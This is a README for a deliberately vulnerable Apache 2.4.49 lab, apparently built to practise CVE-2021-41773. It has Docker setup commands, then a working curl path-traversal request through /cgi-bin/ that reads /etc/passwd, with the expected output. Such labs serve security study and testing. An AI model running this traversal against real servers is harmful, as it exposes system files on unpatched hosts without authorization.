# CVE-2021-41773 Vulnerable service

## Installation

Several options:

### 1. Docker container
```bash
docker run -d -p 8080:80 12345qwert123456/apache_2_4_49_cve-2021-41773
```

### 2. Dockerfile
```bash
git clone https://github.com/12345qwert123456/CVE-2021-41773.git

cd CVE-2021-41773-Vulnerable-service/2.4.49

docker build -t apache_2_4_49_cve-2021-41773 .

docker run -d -p 8080:80 apache_2_4_49_cve-2021-41773
```

## Explotation

Command:
```bash
curl --path-as-is "http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
```

Expected output:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```
